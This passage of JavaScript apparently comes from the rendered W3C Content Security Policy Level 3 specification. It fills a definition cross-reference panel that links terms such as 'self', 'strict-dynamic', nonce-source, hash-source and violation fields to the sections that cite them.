        window.dfnpanelData['grammardef-serialized-source-list'] = { "dfnID": "grammardef-serialized-source-list", "url": "#grammardef-serialized-source-list", "dfnText": "serialized-source-list", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-serialized-source-list" }], "title": "6.1.1. child-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460" }], "title": "6.1.2. connect-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2461" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2462" }], "title": "6.1.4. font-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2463" }], "title": "6.1.5. frame-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2464" }], "title": "6.1.6. img-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2465" }], "title": "6.1.7. manifest-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2466" }], "title": "6.1.8. media-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2467" }], "title": "6.1.9. object-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2468" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u24ea" }], "title": "6.1.11. script-src-elem" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2460" }], "title": "6.1.12. script-src-attr" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2461" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2462" }], "title": "6.1.14. style-src-elem" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2463" }], "title": "6.1.15. style-src-attr" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2464" }], "title": "6.2.2. worker-src" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2465" }], "title": "6.3.1. base-uri" }, { "refs": [{ "id": "ref-for-grammardef-serialized-source-list\u2460\u2466" }], "title": "6.4.1. form-action" }], "external": false };
        window.dfnpanelData['grammardef-none'] = { "dfnID": "grammardef-none", "url": "#grammardef-none", "dfnText": "'none'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-none" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-none\u2460" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-grammardef-none\u2461" }], "title": "8.5. \n      Strict CSP\n    " }], "external": false };
        window.dfnpanelData['grammardef-source-expression'] = { "dfnID": "grammardef-source-expression", "url": "#grammardef-source-expression", "dfnText": "source-expression", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-source-expression" }, { "id": "ref-for-grammardef-source-expression\u2460" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-source-expression\u2461" }, { "id": "ref-for-grammardef-source-expression\u2462" }], "title": "8.5. \n      Strict CSP\n    " }], "external": false };
        window.dfnpanelData['grammardef-scheme-source'] = { "dfnID": "grammardef-scheme-source", "url": "#grammardef-scheme-source", "dfnText": "scheme-source", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-scheme-source" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-scheme-source\u2460" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-grammardef-scheme-source\u2461" }, { "id": "ref-for-grammardef-scheme-source\u2462" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-grammardef-scheme-source\u2463" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-grammardef-scheme-source\u2464" }], "title": "8.5. \n      Strict CSP\n    " }], "external": false };
        window.dfnpanelData['grammardef-host-source'] = { "dfnID": "grammardef-host-source", "url": "#grammardef-host-source", "dfnText": "host-source", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-host-source" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-host-source\u2460" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-grammardef-host-source\u2461" }, { "id": "ref-for-grammardef-host-source\u2462" }, { "id": "ref-for-grammardef-host-source\u2463" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-grammardef-host-source\u2464" }], "title": "7.3. Nonce Retargeting" }, { "refs": [{ "id": "ref-for-grammardef-host-source\u2465" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }], "external": false };
        window.dfnpanelData['grammardef-scheme-part'] = { "dfnID": "grammardef-scheme-part", "url": "#grammardef-scheme-part", "dfnText": "scheme-part", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-scheme-part" }, { "id": "ref-for-grammardef-scheme-part\u2460" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-scheme-part\u2461" }, { "id": "ref-for-grammardef-scheme-part\u2462" }, { "id": "ref-for-grammardef-scheme-part\u2463" }, { "id": "ref-for-grammardef-scheme-part\u2464" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-grammardef-scheme-part\u2465" }], "title": "6.7.2.9. \n    scheme-part matching\n  " }], "external": false };
        window.dfnpanelData['grammardef-host-part'] = { "dfnID": "grammardef-host-part", "url": "#grammardef-host-part", "dfnText": "host-part", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-host-part" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-host-part\u2460" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-grammardef-host-part\u2461" }], "title": "6.7.2.10. \n    host-part matching\n  " }], "external": false };
        window.dfnpanelData['grammardef-host-char'] = { "dfnID": "grammardef-host-char", "url": "#grammardef-host-char", "dfnText": "host-char", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-host-char" }, { "id": "ref-for-grammardef-host-char\u2460" }, { "id": "ref-for-grammardef-host-char\u2461" }], "title": "2.3.1. Source Lists" }], "external": false };
        window.dfnpanelData['grammardef-port-part'] = { "dfnID": "grammardef-port-part", "url": "#grammardef-port-part", "dfnText": "port-part", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-port-part" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-port-part\u2460" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-grammardef-port-part\u2461" }], "title": "6.7.2.11. \n    port-part matching\n  " }], "external": false };
        window.dfnpanelData['grammardef-path-part'] = { "dfnID": "grammardef-path-part", "url": "#grammardef-path-part", "dfnText": "path-part", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-path-part" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-path-part\u2460" }, { "id": "ref-for-grammardef-path-part\u2461" }], "title": "6.7.2.8. \n    Does url match expression in origin with redirect count?\n  " }, { "refs": [{ "id": "ref-for-grammardef-path-part\u2462" }], "title": "6.7.2.12. \n    path-part matching\n  " }], "external": false };
        window.dfnpanelData['grammardef-keyword-source'] = { "dfnID": "grammardef-keyword-source", "url": "#grammardef-keyword-source", "dfnText": "keyword-source", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-keyword-source" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-keyword-source\u2460" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-grammardef-keyword-source\u2461" }, { "id": "ref-for-grammardef-keyword-source\u2462" }, { "id": "ref-for-grammardef-keyword-source\u2463" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-grammardef-keyword-source\u2464" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-grammardef-keyword-source\u2465" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-grammardef-keyword-source\u2466" }], "title": "8.5. \n      Strict CSP\n    " }], "external": false };
        window.dfnpanelData['grammardef-self'] = { "dfnID": "grammardef-self", "url": "#grammardef-self", "dfnText": "'self'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-self" }, { "id": "ref-for-grammardef-self\u2460" }], "title": "2.2. Policies" }, { "refs": [{ "id": "ref-for-grammardef-self\u2461" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-self\u2462" }, { "id": "ref-for-grammardef-self\u2463" }, { "id": "ref-for-grammardef-self\u2464" }, { "id": "ref-for-grammardef-self\u2465" }, { "id": "ref-for-grammardef-self\u2466" }, { "id": "ref-for-grammardef-self\u2467" }, { "id": "ref-for-grammardef-self\u2468" }, { "id": "ref-for-grammardef-self\u2460\u24ea" }, { "id": "ref-for-grammardef-self\u2460\u2460" }, { "id": "ref-for-grammardef-self\u2460\u2461" }, { "id": "ref-for-grammardef-self\u2460\u2462" }, { "id": "ref-for-grammardef-self\u2460\u2463" }, { "id": "ref-for-grammardef-self\u2460\u2464" }, { "id": "ref-for-grammardef-self\u2460\u2465" }, { "id": "ref-for-grammardef-self\u2460\u2466" }, { "id": "ref-for-grammardef-self\u2460\u2467" }, { "id": "ref-for-grammardef-self\u2460\u2468" }, { "id": "ref-for-grammardef-self\u2461\u24ea" }, { "id": "ref-for-grammardef-self\u2461\u2460" }, { "id": "ref-for-grammardef-self\u2461\u2461" }, { "id": "ref-for-grammardef-self\u2461\u2462" }, { "id": "ref-for-grammardef-self\u2461\u2463" }, { "id": "ref-for-grammardef-self\u2461\u2464" }, { "id": "ref-for-grammardef-self\u2461\u2465" }, { "id": "ref-for-grammardef-self\u2461\u2466" }], "title": "6.1.3. default-src" }, { "refs": [{ "id": "ref-for-grammardef-self\u2461\u2467" }], "title": "6.4.2. frame-ancestors" }, { "refs": [{ "id": "ref-for-grammardef-self\u2461\u2468" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-grammardef-self\u2462\u24ea" }], "title": "8.5. \n      Strict CSP\n    " }], "external": false };
        window.dfnpanelData['grammardef-unsafe-inline'] = { "dfnID": "grammardef-unsafe-inline", "url": "#grammardef-unsafe-inline", "dfnText": "'unsafe-inline'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-unsafe-inline" }], "title": "6. \n    Content Security Policy Directives\n  " }, { "refs": [{ "id": "ref-for-grammardef-unsafe-inline\u2460" }, { "id": "ref-for-grammardef-unsafe-inline\u2461" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-grammardef-unsafe-inline\u2462" }, { "id": "ref-for-grammardef-unsafe-inline\u2463" }], "title": "7.1. Nonce Reuse" }, { "refs": [{ "id": "ref-for-grammardef-unsafe-inline\u2464" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }], "external": false };
        window.dfnpanelData['grammardef-unsafe-eval'] = { "dfnID": "grammardef-unsafe-eval", "url": "#grammardef-unsafe-eval", "dfnText": "'unsafe-eval'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-unsafe-eval" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-grammardef-unsafe-eval\u2460" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }], "external": false };
        window.dfnpanelData['grammardef-strict-dynamic'] = { "dfnID": "grammardef-strict-dynamic", "url": "#grammardef-strict-dynamic", "dfnText": "'strict-dynamic'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-strict-dynamic" }, { "id": "ref-for-grammardef-strict-dynamic\u2460" }], "title": "6.7.1.1. \n    Script directives pre-request check\n  " }, { "refs": [{ "id": "ref-for-grammardef-strict-dynamic\u2461" }], "title": "6.7.1.2. \n    Script directives post-request check\n  " }, { "refs": [{ "id": "ref-for-grammardef-strict-dynamic\u2462" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-grammardef-strict-dynamic\u2463" }, { "id": "ref-for-grammardef-strict-dynamic\u2464" }, { "id": "ref-for-grammardef-strict-dynamic\u2465" }, { "id": "ref-for-grammardef-strict-dynamic\u2466" }, { "id": "ref-for-grammardef-strict-dynamic\u2467" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-grammardef-strict-dynamic\u2468" }, { "id": "ref-for-grammardef-strict-dynamic\u2460\u24ea" }, { "id": "ref-for-grammardef-strict-dynamic\u2460\u2460" }], "title": "8.5. \n      Strict CSP\n    " }], "external": false };
        window.dfnpanelData['grammardef-unsafe-hashes'] = { "dfnID": "grammardef-unsafe-hashes", "url": "#grammardef-unsafe-hashes", "dfnText": "'unsafe-hashes'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-unsafe-hashes" }, { "id": "ref-for-grammardef-unsafe-hashes\u2460" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-grammardef-unsafe-hashes\u2461" }, { "id": "ref-for-grammardef-unsafe-hashes\u2462" }], "title": "8.3. \n      Usage of \"'unsafe-hashes'\"\n    " }], "external": false };
        window.dfnpanelData['grammardef-report-sample'] = { "dfnID": "grammardef-report-sample", "url": "#grammardef-report-sample", "dfnText": "'report-sample'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-report-sample" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-grammardef-report-sample\u2460" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-grammardef-report-sample\u2461" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }], "external": false };
        window.dfnpanelData['grammardef-wasm-unsafe-eval'] = { "dfnID": "grammardef-wasm-unsafe-eval", "url": "#grammardef-wasm-unsafe-eval", "dfnText": "'wasm-unsafe-eval'", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-wasm-unsafe-eval" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }], "external": false };
        window.dfnpanelData['grammardef-nonce-source'] = { "dfnID": "grammardef-nonce-source", "url": "#grammardef-nonce-source", "dfnText": "nonce-source", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-nonce-source" }, { "id": "ref-for-grammardef-nonce-source\u2460" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2461" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2462" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2463" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2464" }], "title": "6.7.3.1. \n    Is element nonceable?\n  " }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2465" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2466" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2467" }], "title": "7.1. Nonce Reuse" }, { "refs": [{ "id": "ref-for-grammardef-nonce-source\u2468" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }], "external": false };
        window.dfnpanelData['grammardef-base64-value'] = { "dfnID": "grammardef-base64-value", "url": "#grammardef-base64-value", "dfnText": "base64-value", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-base64-value" }, { "id": "ref-for-grammardef-base64-value\u2460" }, { "id": "ref-for-grammardef-base64-value\u2461" }, { "id": "ref-for-grammardef-base64-value\u2462" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-base64-value\u2463" }], "title": "6.7.2.3. \n    Does nonce match source list?\n  " }, { "refs": [{ "id": "ref-for-grammardef-base64-value\u2464" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-grammardef-base64-value\u2465" }, { "id": "ref-for-grammardef-base64-value\u2466" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": false };
        window.dfnpanelData['grammardef-hash-source'] = { "dfnID": "grammardef-hash-source", "url": "#grammardef-hash-source", "dfnText": "hash-source", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-hash-source" }, { "id": "ref-for-grammardef-hash-source\u2460" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2461" }], "title": "6.1.10. script-src" }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2462" }], "title": "6.1.13. style-src" }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2463" }, { "id": "ref-for-grammardef-hash-source\u2464" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2465" }], "title": "6.7.3.2. \n    Does a source list allow all inline behavior for type?\n  " }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2466" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2467" }], "title": "8.2. \n    Usage of \"'strict-dynamic'\"\n  " }, { "refs": [{ "id": "ref-for-grammardef-hash-source\u2468" }], "title": "8.4. \n      Allowing external JavaScript via hashes\n    " }], "external": false };
        window.dfnpanelData['grammardef-hash-algorithm'] = { "dfnID": "grammardef-hash-algorithm", "url": "#grammardef-hash-algorithm", "dfnText": "hash-algorithm", "refSections": [{ "refs": [{ "id": "ref-for-grammardef-hash-algorithm" }], "title": "2.3.1. Source Lists" }, { "refs": [{ "id": "ref-for-grammardef-hash-algorithm\u2460" }, { "id": "ref-for-grammardef-hash-algorithm\u2461" }], "title": "6.7.2.4. \n    Does integrity metadata match source list?\n  " }, { "refs": [{ "id": "ref-for-grammardef-hash-algorithm\u2462" }, { "id": "ref-for-grammardef-hash-algorithm\u2463" }, { "id": "ref-for-grammardef-hash-algorithm\u2464" }], "title": "6.7.3.3. \n    Does element match source list for type and source?\n  " }], "external": false };
        window.dfnpanelData['violation'] = { "dfnID": "violation", "url": "#violation", "dfnText": "violation", "refSections": [{ "refs": [{ "id": "ref-for-violation" }, { "id": "ref-for-violation\u2460" }, { "id": "ref-for-violation\u2461" }, { "id": "ref-for-violation\u2462" }, { "id": "ref-for-violation\u2463" }, { "id": "ref-for-violation\u2464" }, { "id": "ref-for-violation\u2465" }, { "id": "ref-for-violation\u2466" }, { "id": "ref-for-violation\u2467" }, { "id": "ref-for-violation\u2468" }, { "id": "ref-for-violation\u2460\u24ea" }, { "id": "ref-for-violation\u2460\u2460" }, { "id": "ref-for-violation\u2460\u2461" }, { "id": "ref-for-violation\u2460\u2462" }, { "id": "ref-for-violation\u2460\u2463" }, { "id": "ref-for-violation\u2460\u2464" }, { "id": "ref-for-violation\u2460\u2465" }, { "id": "ref-for-violation\u2460\u2466" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-violation\u2460\u2467" }, { "id": "ref-for-violation\u2460\u2468" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation\u2461\u24ea" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-violation\u2461\u2460" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation\u2461\u2461" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-violation\u2461\u2462" }], "title": "6.5. \n    Reporting Directives\n  " }], "external": false };
        window.dfnpanelData['violation-global-object'] = { "dfnID": "violation-global-object", "url": "#violation-global-object", "dfnText": "global object", "refSections": [{ "refs": [{ "id": "ref-for-violation-global-object" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-violation-global-object\u2460" }, { "id": "ref-for-violation-global-object\u2461" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-global-object\u2462" }, { "id": "ref-for-violation-global-object\u2463" }, { "id": "ref-for-violation-global-object\u2464" }, { "id": "ref-for-violation-global-object\u2465" }, { "id": "ref-for-violation-global-object\u2466" }, { "id": "ref-for-violation-global-object\u2467" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-url'] = { "dfnID": "violation-url", "url": "#violation-url", "dfnText": "url", "refSections": [{ "refs": [{ "id": "ref-for-violation-url" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-url\u2460" }, { "id": "ref-for-violation-url\u2461" }, { "id": "ref-for-violation-url\u2462" }, { "id": "ref-for-violation-url\u2463" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-status'] = { "dfnID": "violation-status", "url": "#violation-status", "dfnText": "status", "refSections": [{ "refs": [{ "id": "ref-for-violation-status" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-status\u2460" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-status\u2461" }, { "id": "ref-for-violation-status\u2462" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-resource'] = { "dfnID": "violation-resource", "url": "#violation-resource", "dfnText": "resource", "refSections": [{ "refs": [{ "id": "ref-for-violation-resource" }, { "id": "ref-for-violation-resource\u2460" }, { "id": "ref-for-violation-resource\u2461" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-violation-resource\u2462" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2463" }], "title": "2.4.2. \n    Create a violation object for request, and policy.\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2464" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2465" }, { "id": "ref-for-violation-resource\u2466" }], "title": "4.2.4. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2467" }, { "id": "ref-for-violation-resource\u2468" }], "title": "4.2.5. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u24ea" }], "title": "4.3.1. \n    Should RTC connections be blocked for global?\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u2460" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u2461" }], "title": "4.5.1. \n  EnsureCSPDoesNotBlockWasmByteCompilationrealm\n" }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u2462" }], "title": "5.2. \n    Obtain the blockedURI of a violation\u2019s resource\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u2463" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u2464" }, { "id": "ref-for-violation-resource\u2460\u2465" }], "title": "5.5. \n    Report a violation\n  " }, { "refs": [{ "id": "ref-for-violation-resource\u2460\u2466" }], "title": "6.3.1.1. \n    Is base allowed for document?\n  " }], "external": false };
        window.dfnpanelData['violation-referrer'] = { "dfnID": "violation-referrer", "url": "#violation-referrer", "dfnText": "referrer", "refSections": [{ "refs": [{ "id": "ref-for-violation-referrer" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-referrer\u2460" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-referrer\u2461" }, { "id": "ref-for-violation-referrer\u2462" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-policy'] = { "dfnID": "violation-policy", "url": "#violation-policy", "dfnText": "policy", "refSections": [{ "refs": [{ "id": "ref-for-violation-policy" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-policy\u2460" }, { "id": "ref-for-violation-policy\u2461" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-policy\u2462" }, { "id": "ref-for-violation-policy\u2463" }, { "id": "ref-for-violation-policy\u2464" }, { "id": "ref-for-violation-policy\u2465" }, { "id": "ref-for-violation-policy\u2466" }, { "id": "ref-for-violation-policy\u2467" }, { "id": "ref-for-violation-policy\u2468" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-disposition'] = { "dfnID": "violation-disposition", "url": "#violation-disposition", "dfnText": "disposition", "refSections": [{ "refs": [{ "id": "ref-for-violation-disposition" }, { "id": "ref-for-violation-disposition\u2460" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-effective-directive'] = { "dfnID": "violation-effective-directive", "url": "#violation-effective-directive", "dfnText": "effective directive", "refSections": [{ "refs": [{ "id": "ref-for-violation-effective-directive" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-effective-directive\u2460" }, { "id": "ref-for-violation-effective-directive\u2461" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-effective-directive\u2462" }, { "id": "ref-for-violation-effective-directive\u2463" }, { "id": "ref-for-violation-effective-directive\u2464" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-source-file'] = { "dfnID": "violation-source-file", "url": "#violation-source-file", "dfnText": "source file", "refSections": [{ "refs": [{ "id": "ref-for-violation-source-file" }, { "id": "ref-for-violation-source-file\u2460" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-source-file\u2461" }, { "id": "ref-for-violation-source-file\u2462" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-source-file\u2463" }, { "id": "ref-for-violation-source-file\u2464" }, { "id": "ref-for-violation-source-file\u2465" }, { "id": "ref-for-violation-source-file\u2466" }, { "id": "ref-for-violation-source-file\u2467" }, { "id": "ref-for-violation-source-file\u2468" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-line-number'] = { "dfnID": "violation-line-number", "url": "#violation-line-number", "dfnText": "line number", "refSections": [{ "refs": [{ "id": "ref-for-violation-line-number" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-line-number\u2460" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-line-number\u2461" }, { "id": "ref-for-violation-line-number\u2462" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-column-number'] = { "dfnID": "violation-column-number", "url": "#violation-column-number", "dfnText": "column number", "refSections": [{ "refs": [{ "id": "ref-for-violation-column-number" }], "title": "2.4.1. \n    Create a violation object for global, policy, and directive\n  " }, { "refs": [{ "id": "ref-for-violation-column-number\u2460" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-column-number\u2461" }, { "id": "ref-for-violation-column-number\u2462" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-element'] = { "dfnID": "violation-element", "url": "#violation-element", "dfnText": "element", "refSections": [{ "refs": [{ "id": "ref-for-violation-element" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-violation-element\u2460" }, { "id": "ref-for-violation-element\u2461" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
        window.dfnpanelData['violation-sample'] = { "dfnID": "violation-sample", "url": "#violation-sample", "dfnText": "sample", "refSections": [{ "refs": [{ "id": "ref-for-violation-sample" }], "title": "1.3. Changes from Level 2" }, { "refs": [{ "id": "ref-for-violation-sample\u2460" }], "title": "2.4. Violations" }, { "refs": [{ "id": "ref-for-violation-sample\u2461" }], "title": "4.2.3. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  " }, { "refs": [{ "id": "ref-for-violation-sample\u2462" }], "title": "4.4.1. \n    EnsureCSPDoesNotBlockStringCompilation(realm, parameterStrings, bodyString, codeString, compilationType, parameterArgs, bodyArg)\n  " }, { "refs": [{ "id": "ref-for-violation-sample\u2463" }], "title": "5.3. \n    Obtain the deprecated serialization of violation\n  " }, { "refs": [{ "id": "ref-for-violation-sample\u2464" }, { "id": "ref-for-violation-sample\u2465" }], "title": "5.5. \n    Report a violation\n  " }], "external": false };
